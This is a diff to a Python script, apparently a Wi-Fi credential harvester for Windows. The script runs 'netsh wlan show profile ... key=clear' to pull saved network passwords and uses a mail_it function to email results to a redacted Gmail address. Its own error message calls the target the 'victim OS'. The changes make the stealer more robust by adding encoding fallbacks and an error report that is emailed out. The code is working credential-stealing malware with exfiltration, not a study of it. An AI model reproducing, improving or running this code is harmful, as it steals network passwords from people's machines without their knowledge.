@@ -13,20 +13,32 @@ def mail_it(email, passwd, to_mail, msg):
 def get_passwd(wifi):
     cmd = "netsh wlan show profile " + wifi + " key=clear"
     wifi_info = subprocess.check_output(cmd, shell=True)
-    wifi_info=wifi_info.decode('utf-8')
+    try:
+        wifi_info=wifi_info.decode('utf-8')
+    except:
+        wifi_info = str(wifi_info)
     wifi_pass = re.search("(?:Key Content\s*:\s)(.*)", wifi_info)
     return wifi_pass
 
 def wifi_harvester():
     cmd = "netsh wlan show profile"
     network = subprocess.check_output(cmd, shell=True)
-    network = network.decode('utf-8')
-    net_names = re.findall("(?:Profile\s*:\s)(.*)", network)
+    try:
+        network = network.decode('utf-8')
+    except:
+        network = str(network)
+    try:
+        net_names = re.findall("(?:Profile\s*:\s)(.*)", network)
+    except:
+        mail_it("xxxxxxxxxx@gmail.com", "********", "xxxxxxxxx@gmail.com", "[-] ERROR, Unsupported encoding in victim OS")
     result = {}
     for wifi in net_names:
         cmd = "netsh wlan show profile " + wifi
         net_profile = subprocess.check_output(cmd, shell=True)
-        net_profile = net_profile.decode('utf-8')
+        try:
+            net_profile = net_profile.decode('utf-8')         
+        except:
+            net_profile =str(net_profile)
         if not "no such wireless interface" in net_profile:
             wifi_pass = get_passwd(wifi)
             if wifi_pass:
